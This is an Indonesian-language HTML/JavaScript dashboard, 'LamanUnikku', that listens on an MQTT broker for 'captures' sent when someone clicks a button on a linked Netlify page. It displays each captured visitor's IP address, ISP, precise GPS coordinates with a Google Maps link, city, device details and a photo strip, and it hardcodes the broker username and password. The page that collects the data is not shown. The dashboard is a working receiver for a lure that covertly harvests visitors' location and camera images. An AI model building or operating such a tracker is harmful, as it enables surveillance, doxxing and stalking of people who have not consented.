<!doctype html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Dashboard — LamanUnikku</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

    :root {
      --bg:      #0d0d12;
      --bg2:     #13131a;
      --bg3:     #1a1a24;
      --border:  rgba(255,255,255,0.07);
      --orange:  #f97316;
      --green:   #22c55e;
      --red:     #ef4444;
      --blue:    #3b82f6;
      --text:    #e2e8f0;
      --muted:   #64748b;
      --font:    'Plus Jakarta Sans', sans-serif;
      --mono:    'JetBrains Mono', monospace;
    }

    html, body {
      height: 100%;
      background: var(--bg);
      color: var(--text);
      font-family: var(--font);
      font-size: 14px;
    }

    /* ── Header ── */
    .header {
      position: sticky; top: 0; z-index: 50;
      background: rgba(13,13,18,0.9);
      backdrop-filter: blur(12px);
      border-bottom: 1px solid var(--border);
      padding: 14px 28px;
      display: flex; align-items: center; justify-content: space-between;
      gap: 16px;
    }
    .header-left { display: flex; align-items: center; gap: 14px; }
    .logo {
      font-size: 1.05rem; font-weight: 800; color: #fff;
      letter-spacing: -0.02em;
    }
    .logo span { color: var(--orange); }
    .header-badge {
      display: flex; align-items: center; gap: 6px;
      font-size: 0.7rem; font-weight: 600; letter-spacing: 0.1em;
      text-transform: uppercase; color: var(--muted);
      background: var(--bg3); border: 1px solid var(--border);
      border-radius: 100px; padding: 4px 12px;
    }
    .live-dot {
      width: 7px; height: 7px; border-radius: 50%;
      background: var(--red);
    }
    .live-dot.connected { background: var(--green); animation: pulse 1.5s ease-in-out infinite; }
    @keyframes pulse { 0%,100%{box-shadow:0 0 0 0 rgba(34,197,94,0.4)} 50%{box-shadow:0 0 0 6px rgba(34,197,94,0)} }

    .header-stats {
      display: flex; align-items: center; gap: 20px;
      font-size: 0.8rem; color: var(--muted);
    }
    .stat-item { display: flex; align-items: center; gap: 6px; }
    .stat-val  { font-weight: 700; color: var(--text); font-size: 1rem; }

    .btn-clear {
      background: var(--bg3); border: 1px solid var(--border);
      color: var(--muted); border-radius: 6px; padding: 7px 14px;
      font-family: var(--font); font-size: 0.8rem; font-weight: 600;
      cursor: pointer; transition: all .2s;
    }
    .btn-clear:hover { border-color: var(--red); color: var(--red); }

    /* ── Tombol hapus per card ── */
    .btn-delete-card {
      display: block; width: 100%;
      margin-top: 10px; padding: 7px;
      background: transparent;
      border: 1px solid rgba(239,68,68,0.25);
      border-radius: 6px;
      color: rgba(239,68,68,0.6);
      font-family: var(--font); font-size: 0.75rem; font-weight: 600;
      cursor: pointer; text-align: center;
      transition: all .2s;
    }
    .btn-delete-card:hover {
      background: rgba(239,68,68,0.12);
      border-color: var(--red);
      color: var(--red);
    }

    /* ── Connection bar ── */
    .conn-bar {
      background: var(--bg2); border-bottom: 1px solid var(--border);
      padding: 8px 28px;
      display: flex; align-items: center; gap: 10px;
      font-family: var(--mono); font-size: 0.72rem; color: var(--muted);
    }
    .conn-bar span { color: var(--orange); }

    /* ── Layout ── */
    .main { padding: 28px; max-width: 1400px; margin: 0 auto; }

    /* ── Empty state ── */
    .empty-state {
      display: flex; flex-direction: column; align-items: center;
      justify-content: center; gap: 16px; padding: 80px 20px;
      text-align: center; color: var(--muted);
    }
    .empty-icon { font-size: 3rem; opacity: 0.4; }
    .empty-title { font-size: 1.1rem; font-weight: 600; color: var(--text); }
    .empty-sub { font-size: 0.85rem; max-width: 360px; line-height: 1.6; }
    .spinner {
      width: 32px; height: 32px; border: 3px solid var(--border);
      border-top-color: var(--orange); border-radius: 50%;
      animation: spin .8s linear infinite; margin: 0 auto;
    }
    @keyframes spin { to { transform: rotate(360deg); } }

    /* ── Grid ── */
    .captures-grid {
      display: grid;
      grid-template-columns: repeat(auto-fill, minmax(360px, 1fr));
      gap: 20px;
    }

    /* ── Card ── */
    .card {
      background: var(--bg2); border: 1px solid var(--border);
      border-radius: 14px; overflow: hidden;
      animation: slideIn .4s ease both;
      transition: border-color .2s;
    }
    .card:hover { border-color: rgba(249,115,22,0.3); }
    @keyframes slideIn { from{opacity:0;transform:translateY(16px)} to{opacity:1;transform:translateY(0)} }

    /* New card flash */
    .card.new { border-color: var(--orange); }
    .card.new { animation: slideIn .4s ease both, newFlash 1.5s ease forwards; }
    @keyframes newFlash {
      0%,40%  { border-color: var(--orange); box-shadow: 0 0 20px rgba(249,115,22,0.2); }
      100%    { border-color: var(--border); box-shadow: none; }
    }

    .card-photo {
      width: 100%; aspect-ratio: 4/3;
      background: var(--bg3);
      position: relative; overflow: hidden;
    }
    .card-photo img {
      width: 100%; height: 100%; object-fit: cover;
      display: block;
    }
    .card-photo .no-photo {
      width: 100%; height: 100%;
      display: flex; flex-direction: column;
      align-items: center; justify-content: center;
      gap: 8px; color: var(--muted); font-size: 0.8rem;
    }
    .no-photo-icon { font-size: 2.5rem; opacity: 0.3; }

    .card-badge {
      position: absolute; top: 10px; right: 10px;
      background: rgba(0,0,0,0.7); backdrop-filter: blur(8px);
      border-radius: 6px; padding: 3px 8px;
      font-family: var(--mono); font-size: 0.65rem;
      color: var(--orange); font-weight: 600; letter-spacing: .05em;
    }

    .card-body { padding: 16px; }

    .card-header {
      display: flex; align-items: flex-start;
      justify-content: space-between; gap: 8px; margin-bottom: 12px;
    }
    .card-id {
      font-family: var(--mono); font-size: 0.72rem;
      color: var(--orange); font-weight: 600;
    }
    .card-time {
      font-size: 0.72rem; color: var(--muted); white-space: nowrap;
    }

    .info-grid {
      display: grid; grid-template-columns: 1fr 1fr; gap: 8px;
      margin-bottom: 12px;
    }
    .info-item { display: flex; flex-direction: column; gap: 2px; }
    .info-label {
      font-size: 0.65rem; font-weight: 700; letter-spacing: 0.1em;
      text-transform: uppercase; color: var(--muted);
    }
    .info-val {
      font-size: 0.82rem; font-weight: 500; color: var(--text);
      overflow: hidden; text-overflow: ellipsis; white-space: nowrap;
    }
    .info-val.mono { font-family: var(--mono); font-size: 0.78rem; }

    .info-full { grid-column: 1/-1; }

    /* Source badge */
    .source-badge {
      display: inline-flex; align-items: center; gap: 5px;
      font-size: 0.68rem; font-weight: 700; letter-spacing: 0.08em;
      text-transform: uppercase; border-radius: 100px;
      padding: 3px 10px; margin-bottom: 10px;
    }
    .source-badge.gps  { background: rgba(34,197,94,0.12);  color: #22c55e; border: 1px solid rgba(34,197,94,0.3); }
    .source-badge.ip   { background: rgba(249,115,22,0.12); color: #f97316; border: 1px solid rgba(249,115,22,0.3); }

    /* Map link */
    .map-link {
      display: inline-flex; align-items: center; gap: 5px;
      font-size: 0.75rem; font-weight: 600; color: var(--blue);
      text-decoration: none; margin-bottom: 10px;
      padding: 5px 10px; border-radius: 6px;
      background: rgba(59,130,246,0.08); border: 1px solid rgba(59,130,246,0.2);
      transition: all .2s;
    }
    .map-link:hover { background: rgba(59,130,246,0.15); }

    /* Device bar */
    .device-bar {
      background: var(--bg3); border-radius: 6px; padding: 8px 10px;
      font-family: var(--mono); font-size: 0.65rem; color: var(--muted);
      overflow: hidden; text-overflow: ellipsis; white-space: nowrap;
      border: 1px solid var(--border);
    }

    /* ── Toast ── */
    .toast {
      position: fixed; bottom: 24px; right: 24px; z-index: 999;
      background: var(--bg2); border: 1px solid var(--border);
      border-radius: 10px; padding: 12px 18px;
      display: flex; align-items: center; gap: 10px;
      font-size: 0.82rem; font-weight: 500;
      box-shadow: 0 8px 32px rgba(0,0,0,0.5);
      animation: toastIn .3s ease;
      max-width: 320px;
    }
    @keyframes toastIn { from{opacity:0;transform:translateY(12px)} to{opacity:1;transform:translateY(0)} }
    .toast.out { animation: toastOut .3s ease forwards; }
    @keyframes toastOut { to{opacity:0;transform:translateY(12px)} }

    /* ── Scrollbar ── */
    ::-webkit-scrollbar { width: 6px; }
    ::-webkit-scrollbar-track { background: var(--bg); }
    ::-webkit-scrollbar-thumb { background: var(--bg3); border-radius: 3px; }
  </style>
</head>
<body>

<!-- Header -->
<header class="header">
  <div class="header-left">
    <div class="logo">LamanUnikku<span>.</span></div>
    <div class="header-badge">
      <span class="live-dot" id="liveDot"></span>
      <span id="connLabel">Menghubungkan...</span>
    </div>
  </div>

  <div class="header-stats">
    <div class="stat-item">
      Total <span class="stat-val" id="totalCount">0</span>
    </div>
    <div class="stat-item">
      Sesi ini <span class="stat-val" id="sessionCount">0</span>
    </div>
  </div>

  <button class="btn-clear" id="btnClear">Hapus Semua</button>
</header>

<!-- Connection info bar -->
<div class="conn-bar">
  Broker: <span>mqtt.broker.com</span>&nbsp;&nbsp;|&nbsp;&nbsp;
  Topic: <span id="topicLabel">fotoboth/picture/img</span>&nbsp;&nbsp;|&nbsp;&nbsp;
  Client ID: <span id="clientIdLabel">—</span>
</div>

<!-- Main -->
<main class="main">
  <div id="emptyState" class="empty-state">
    <div class="spinner"></div>
    <div class="empty-title">Menunggu Tangkapan...</div>
    <p class="empty-sub">
      Dashboard akan otomatis menampilkan data saat ada yang klik tombol di
      <strong>lamanunikku.netlify.app</strong>
    </p>
  </div>
  <div id="capturesGrid" class="captures-grid" style="display:none"></div>
</main>

<script src="https://unpkg.com/mqtt/dist/mqtt.min.js"></script>

<script>
  /* =========================================================
     CONFIG
     ========================================================= */

  const BROKER = 'wss://83ad14001a70426f806694b5990360ba.s1.eu.hivemq.cloud:8884/mqtt'
  const TOPIC = 'lamanlucuku/v1/captures'
  const CLIENT = 'dashboard_' + Math.random().toString(36).substring(2, 10)

  /*
   * PENTING:
   * Jangan gunakan credential Worker Publish Only di sini.
   *
   * Buat credential HiveMQ TERPISAH:
   *
   * lamanlucuku_dashboard
   * Permission: Subscribe Only
   * Topic: lamanlucuku/v1/captures
   *
   * Untuk produksi, jangan simpan credential ini
   * di JavaScript publik.
   */
  const MQTT_USERNAME = 'lamanlucuku_dashboard'
  const MQTT_PASSWORD = 'lamanlucuku_bengawansolo_jokowi'

  /* =========================================================
     STATE
     ========================================================= */

  let sessionCount = 0
  let allCaptures = JSON.parse(localStorage.getItem('lmk_captures') || '[]')

  /* =========================================================
     DOM
     ========================================================= */

  const liveDot = document.getElementById('liveDot')
  const connLabel = document.getElementById('connLabel')
  const clientLabel = document.getElementById('clientIdLabel')
  const totalEl = document.getElementById('totalCount')
  const sessionEl = document.getElementById('sessionCount')
  const emptyState = document.getElementById('emptyState')
  const grid = document.getElementById('capturesGrid')
  const btnClear = document.getElementById('btnClear')

  /* =========================================================
     INIT
     ========================================================= */

  if (clientLabel) {
    clientLabel.textContent = CLIENT
  }

  renderAll()

  /* =========================================================
     CLEAR ALL
     ========================================================= */

  if (btnClear) {
    btnClear.addEventListener('click', function () {
      if (!confirm('Hapus semua data tangkapan?')) {
        return
      }

      allCaptures = []
      localStorage.removeItem('lmk_captures')
      grid.innerHTML = ''
      renderAll()
    })
  }

  /* =========================================================
     MQTT CONNECT
     ========================================================= */

  const client = mqtt.connect(BROKER, {
    clientId: CLIENT,
    username: MQTT_USERNAME,
    password: MQTT_PASSWORD,
    clean: true,
    connectTimeout: 10000,
    reconnectPeriod: 3000,
    keepalive: 60
  })

  /* =========================================================
     CONNECTED
     ========================================================= */

  client.on('connect', function () {
    console.log('✅ Connected to HiveMQ')
    liveDot.classList.add('connected')
    connLabel.textContent = 'LIVE'

    client.subscribe(TOPIC, { qos: 0 }, function (err) {
      if (err) {
        console.error('❌ Subscribe gagal:', err)
        connLabel.textContent = 'Subscribe gagal'
        return
      }

      console.log('📡 Subscribe berhasil:', TOPIC)
      connLabel.textContent = 'LIVE — Listening'
    })
  })

  /* =========================================================
     MESSAGE RECEIVED
     ========================================================= */

  client.on('message', function (topic, message) {
    console.log('📨 MQTT message:', topic)

    if (topic !== TOPIC) {
      return
    }

    try {
      const text = message.toString()

      console.log('📦 Payload size:', text.length, 'characters')

      const payload = JSON.parse(text)

      console.log('📥 Capture diterima:', payload)

      onCapture(payload)
    } catch (error) {
      console.error('❌ Payload JSON tidak valid:', error)
    }
  })

  /* =========================================================
     MQTT ERROR
     ========================================================= */

  client.on('error', function (err) {
    console.error('❌ MQTT error:', err)
    liveDot.classList.remove('connected')
    connLabel.textContent = 'Error: ' + (err.message || 'MQTT error')
  })

  /* =========================================================
     OFFLINE
     ========================================================= */

  client.on('offline', function () {
    console.warn('⚠️ MQTT offline')
    liveDot.classList.remove('connected')
    connLabel.textContent = 'Terputus — Mencoba ulang...'
  })

  /* =========================================================
     RECONNECT
     ========================================================= */

  client.on('reconnect', function () {
    console.log('🔄 MQTT reconnecting...')
    connLabel.textContent = 'Menghubungkan kembali...'
  })

  /* =========================================================
     CLOSE
     ========================================================= */

  client.on('close', function () {
    console.warn('🔌 MQTT connection closed')
    liveDot.classList.remove('connected')
  })

  /* =========================================================
     HANDLE CAPTURE
     ========================================================= */

  function onCapture(data) {
    if (!data || typeof data !== 'object') {
      console.warn('Payload kosong/tidak valid')
      return
    }

    /* Tambahkan data terbaru di paling atas */
    allCaptures.unshift(data)

    /* Maksimal 100 data di localStorage */
    if (allCaptures.length > 100) {
      allCaptures = allCaptures.slice(0, 100)
    }

    localStorage.setItem('lmk_captures', JSON.stringify(allCaptures))

    /* Session counter */
    sessionCount++

    if (sessionEl) {
      sessionEl.textContent = sessionCount
    }

    /* Buat card */
    const card = buildCard(data, true)

    if (grid.firstChild) {
      grid.insertBefore(card, grid.firstChild)
    } else {
      grid.appendChild(card)
    }

    updateEmpty()
    updateTotal()

    const city = data.location && data.location.city ? data.location.city : 'Unknown'

    showToast('📸 Tangkapan baru dari ' + city)
  }

  /* =========================================================
     RENDER LOCAL STORAGE
     ========================================================= */

  function renderAll() {
    grid.innerHTML = ''

    allCaptures.forEach(function (data) {
      grid.appendChild(buildCard(data, false))
    })

    updateEmpty()
    updateTotal()
  }

  /* =========================================================
     BUILD CARD
     ========================================================= */

  function buildCard(d, isNew) {
    const loc = d.location || {}
    const dev = d.device || {}
    const ts = d.timestamp ? new Date(d.timestamp) : new Date()

    const card = document.createElement('div')
    card.className = 'card' + (isNew ? ' new' : '')

    /* -------------------------------------------------------
       FOTO
       ------------------------------------------------------- */
    // const selfieHtml = d.photo
    //   ? '<img src="' +
    //     escAttr(d.photo) +
    //     '" alt="Foto" loading="lazy" style="width:100%;height:100%;object-fit:cover">'
    //   : '<div class="no-photo">' +
    //     '<span class="no-photo-icon">📷</span>' +
    //     'Tidak ada foto' +
    //     '</div>'
    const selfieHtml = ""

    /* -------------------------------------------------------
       STRIP
       ------------------------------------------------------- */
    let stripSection = ''

    if (d.strip) {
      stripSection =
        '<div style="padding:8px 12px 4px">' +
        '<div style="font-size:.62rem;font-weight:700;letter-spacing:.08em;text-transform:uppercase;color:var(--muted);margin-bottom:6px">' +
        'Foto Strip' +
        '</div>' +
        '<img src="' +
        escAttr(d.strip) +
        '" loading="lazy" style="width:100%;border-radius:6px;border:1px solid var(--border)">' +
        '</div>'
    }

    /* -------------------------------------------------------
       LOCATION SOURCE
       ------------------------------------------------------- */
    const src = loc.source || 'ip'

    const srcLabel =
      src === 'gps'
        ? '📡 GPS — Akurat ±' + (loc.accuracy || '?') + ' m'
        : '🌐 IP Geolocation'

    const sourceBadge =
      '<span class="source-badge ' + escAttr(src) + '">' + srcLabel + '</span>'

    /* -------------------------------------------------------
       MAP
       ------------------------------------------------------- */
    let mapHtml = ''
    const lat = Number(loc.lat) || 0
    const lon = Number(loc.lon) || 0

    if (lat !== 0 || lon !== 0) {
      const mapsUrl =
        'https://maps.google.com/?q=' + encodeURIComponent(lat + ',' + lon)

      const coordLabel =
        src === 'gps'
          ? lat.toFixed(6) + ', ' + lon.toFixed(6)
          : lat.toFixed(4) + ', ' + lon.toFixed(4) + ' (perkiraan)'

      mapHtml =
        '<a class="map-link" href="' +
        escAttr(mapsUrl) +
        '" target="_blank" rel="noopener noreferrer">' +
        '🗺️ Buka Google Maps — ' +
        escHtml(coordLabel) +
        '</a>'
    }

    /* -------------------------------------------------------
       CARD HTML
       ------------------------------------------------------- */
    card.innerHTML =
      // '<div class="card-photo">' +
      selfieHtml +
      '<span class="card-badge">#' +
      escHtml(String(d.id || '?')) +
      '</span>' +
      '</div>' +
      stripSection +
      '<div class="card-body">' +
      '<div class="card-header">' +
      '<span class="card-id">' +
      'ID: ' +
      escHtml(String(d.id || '—')) +
      '</span>' +
      '<span class="card-time">' +
      formatTime(ts) +
      '</span>' +
      '</div>' +
      sourceBadge +
      '<div class="info-grid">' +
      infoItem('IP Address', loc.ip || '—', 'mono') +
      infoItem('ISP / Operator', loc.isp || '—') +
      infoItem(
        'Koordinat',
        lat !== 0 ? lat.toFixed(6) + ', ' + lon.toFixed(6) : '—',
        'mono'
      ) +
      infoItem(
        'Akurasi GPS',
        loc.accuracy ? '±' + loc.accuracy + ' m' : 'N/A (IP)'
      ) +
      infoItem('Kota', loc.city || '—') +
      infoItem('Wilayah', loc.region || '—') +
      infoItem('Negara', loc.country || '—') +
      infoItem('Timezone', loc.timezone || '—') +
      infoItem('Layar', dev.screen || '—') +
      infoItem('Bahasa', dev.language || '—') +
      '</div>' +
      mapHtml +
      '<div class="device-bar">' +
      escHtml(dev.userAgent || '—') +
      '</div>' +
      '<button class="btn-delete-card" title="Hapus card ini">' +
      '✕ Hapus' +
      '</button>' +
      '</div>'

    /* -------------------------------------------------------
       DELETE
       ------------------------------------------------------- */
    const deleteButton = card.querySelector('.btn-delete-card')

    deleteButton.addEventListener('click', function () {
      const cardId = d.id

      if (!confirm('Hapus card ID ' + (cardId || 'ini') + '?')) {
        return
      }

      const index = allCaptures.findIndex(function (item) {
        return String(item.id || '') === String(cardId || '')
      })

      if (index !== -1) {
        allCaptures.splice(index, 1)
        localStorage.setItem('lmk_captures', JSON.stringify(allCaptures))
      }

      card.remove()
      updateEmpty()
      updateTotal()
      showToast('🗑️ Card berhasil dihapus')
    })

    return card
  }

  /* =========================================================
     INFO ITEM
     ========================================================= */

  function infoItem(label, val, extra) {
    return (
      '<div class="info-item' +
      (extra ? ' ' + extra : '') +
      '">' +
      '<span class="info-label">' +
      escHtml(label) +
      '</span>' +
      '<span class="info-val' +
      (extra === 'mono' ? ' mono' : '') +
      '">' +
      escHtml(String(val)) +
      '</span>' +
      '</div>'
    )
  }

  /* =========================================================
     HELPERS
     ========================================================= */

  function updateEmpty() {
    const hasData = allCaptures.length > 0
    emptyState.style.display = hasData ? 'none' : 'flex'
    grid.style.display = hasData ? 'grid' : 'none'
  }

  function updateTotal() {
    totalEl.textContent = allCaptures.length
  }

  function formatTime(d) {
    return (
      d.toLocaleDateString('id-ID', {
        day: '2-digit',
        month: 'short',
        year: 'numeric'
      }) +
      ' ' +
      d.toLocaleTimeString('id-ID', {
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit'
      })
    )
  }

  function escHtml(str) {
    return String(str)
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
  }

  function escAttr(str) {
    return escHtml(String(str))
  }

  function showToast(msg) {
    const t = document.createElement('div')
    t.className = 'toast'
    t.textContent = msg
    document.body.appendChild(t)

    setTimeout(function () {
      t.classList.add('out')
      setTimeout(function () {
        t.remove()
      }, 300)
    }, 3500)
  }
</script>
</body>
</html>
